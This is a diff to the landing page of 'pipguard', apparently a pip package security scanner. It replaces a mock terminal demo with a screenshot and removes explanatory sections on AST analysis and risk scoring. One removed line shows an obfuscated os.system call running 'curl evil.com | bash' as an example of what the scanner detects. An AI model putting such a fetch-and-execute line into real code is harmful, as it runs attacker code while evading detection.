@@ -668,10 +668,9 @@
   @media (max-width: 768px) {
     nav { padding: 16px 24px; }
     .hero { padding: 100px 24px 60px; }
-    .demo-section, .ast-section { grid-template-columns: 1fr; padding: 48px 24px; }
-    .how-section, .vs-section, .risk-section, .cta-section { padding: 48px 24px; }
+    .demo-section { grid-template-columns: 1fr; padding: 48px 24px; }
+    .how-section, .vs-section, .cta-section { padding: 48px 24px; }
     .layers { grid-template-columns: 1fr; }
-    .risk-bands { grid-template-columns: 1fr; }
     .hero-title { letter-spacing: -2px; }
     footer { flex-direction: column; gap: 12px; text-align: center; padding: 24px; }
     .cta-step { width: 100%; }
@@ -718,7 +717,7 @@
   </div>
 </section>
 
-<!-- TERMINAL DEMO -->
+<!-- LIVE EXAMPLE IMAGE -->
 <section class="demo-section reveal">
   <div>
     <div class="demo-label">Live example</div>
@@ -728,41 +727,7 @@
     </p>
   </div>
 
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="terminal-dot"></div>
-      <div class="terminal-dot"></div>
-      <div class="terminal-dot"></div>
-      <span class="terminal-title">terminal</span>
-    </div>
-    <div class="terminal-body">
-      <div><span class="t-cmd">$</span> <span class="t-white">pip install some-package</span></div>
-      <div class="t-muted" style="margin: 8px 0 16px">Analyzing some-package...</div>
-
-      <div class="t-label">──────── TRUST SCORE ────────</div>
-      <div class="t-section">
-        <div class="t-row"><span class="t-white">Package age</span><span class="t-red">12d 🔴</span></div>
-        <div class="t-row"><span class="t-white">GitHub repo</span><span class="t-red">none 🔴</span></div>
-        <div class="t-row"><span class="t-white">Download spike</span><span class="t-green">normal ✅</span></div>
-        <div class="t-row"><span class="t-white">Known vulns</span><span class="t-green">none ✅</span></div>
-      </div>
-
-      <div class="t-label">──────── CODE ANALYSIS ──────</div>
-      <div class="t-section">
-        <div class="t-row"><span class="t-white">Network requests</span><span class="t-red">FOUND 🔴</span></div>
-        <div class="t-row"><span class="t-white">Env var access</span><span class="t-red">FOUND 🔴</span></div>
-        <div class="t-row"><span class="t-white">Shell execution</span><span class="t-green">not found ✅</span></div>
-        <div class="t-row"><span class="t-white">Base64 obfuscation</span><span class="t-green">not found ✅</span></div>
-      </div>
-
-      <div class="t-verdict">
-        <span class="t-red">🔴 HIGH RISK</span>
-        <span class="t-white">Score: 75</span>
-      </div>
-
-      <div style="margin-top: 12px; color: var(--muted)">Proceed anyway? <span class="t-white">[y/N]</span> <span class="cursor-blink"></span></div>
-    </div>
-  </div>
+  <img src="Screenshot 2026-04-27 185009.png" alt="pipguard live example" style="width: 100%; border: 1px solid var(--border);">
 </section>
 
 <!-- GITHUB DEMO -->
@@ -845,55 +810,7 @@
   </div>
 </section>
 
-<!-- AST SECTION -->
-<section class="ast-section reveal">
-  <div>
-    <div class="demo-label">Why AST over grep</div>
-    <h2 class="demo-heading">Obfuscation doesn't hide from a parser.</h2>
-    <p class="demo-desc">
-      String matching misses clever obfuscation. pipguard uses Python's AST parser to analyze the actual structure of the code — not just its surface text.
-    </p>
-  </div>
 
-  <div style="display: flex; flex-direction: column; gap: 12px;">
-    <div class="code-block">
-      <div class="code-label bad">GREP MISSES THIS</div>
-      <div><span class="code-comment"># no obvious keywords</span></div>
-      <div><span class="code-fn">getattr</span>(<span class="code-keyword">os</span>, <span class="code-string">'sys'</span>+<span class="code-string">'tem'</span>)(<span class="code-string">'curl evil.com | bash'</span>)</div>
-    </div>
-    <div class="code-block">
-      <div class="code-label caught">AST CATCHES IT</div>
-      <div><span class="code-comment"># AST sees: getattr call on os module</span></div>
-      <div><span class="code-comment"># string concatenation forming 'system'</span></div>
-      <div><span class="code-comment"># shell string passed as argument</span></div>
-      <div style="margin-top: 8px"><span class="t-red">→ shell_execution: TRUE</span></div>
-    </div>
-  </div>
-</section>
-
-<!-- RISK BANDS -->
-<section class="risk-section reveal">
-  <div class="section-label">Risk scoring</div>
-  <h2 class="section-heading">Three outcomes. One decision.</h2>
-
-  <div class="risk-bands">
-    <div class="risk-band">
-      <div class="risk-score">0–30</div>
-      <div class="risk-label">Low Risk</div>
-      <div class="risk-desc">Installs automatically. Signals look clean, no intervention needed.</div>
-    </div>
-    <div class="risk-band">
-      <div class="risk-score">31–60</div>
-      <div class="risk-label">Medium Risk</div>
-      <div class="risk-desc">Asks for confirmation before proceeding. Your call.</div>
-    </div>
-    <div class="risk-band">
-      <div class="risk-score">61+</div>
-      <div class="risk-label">High Risk</div>
-      <div class="risk-desc">Blocked. Requires explicit override with --force to proceed.</div>
-    </div>
-  </div>
-</section>
 
 <!-- FEATURES -->
 <section class="how-section reveal">
